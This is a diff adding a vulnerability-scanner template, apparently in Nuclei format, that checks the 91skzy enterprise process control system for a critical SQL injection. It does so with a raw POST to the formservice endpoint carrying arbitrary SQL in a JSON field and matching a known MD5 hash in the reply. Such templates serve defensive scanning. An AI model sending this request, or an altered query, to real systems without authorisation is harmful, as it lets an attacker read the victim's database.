@@ -1,0 +1,31 @@
+id: 91skzy-formservice-sql-injection
+info:
+  name: 91skzy Enterprise Process Control System Formservice SQL Injection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Spatiotemporal Wisdom enterprise process management and control system formservice SQL injection vulnerability. Attackers can use this vulnerability to obtain sensitive database information.
+  tags:
+    - sql-injection
+  reference:
+    - http://www.91skzy.net
+http:
+  - raw:
+      - |
+        POST /formservice?service=workflow.sqlResult HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3
+        Connection: keep-alive
+        Content-Type: application/json
+
+        {"params": {"a": "11"}, "sql": "select sys.fn_sqlvarbasetostr(HASHBYTES('MD5','1234f56'))"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "bc43c0d0623a5aaa6d9767edd62605ad"
+        part: body
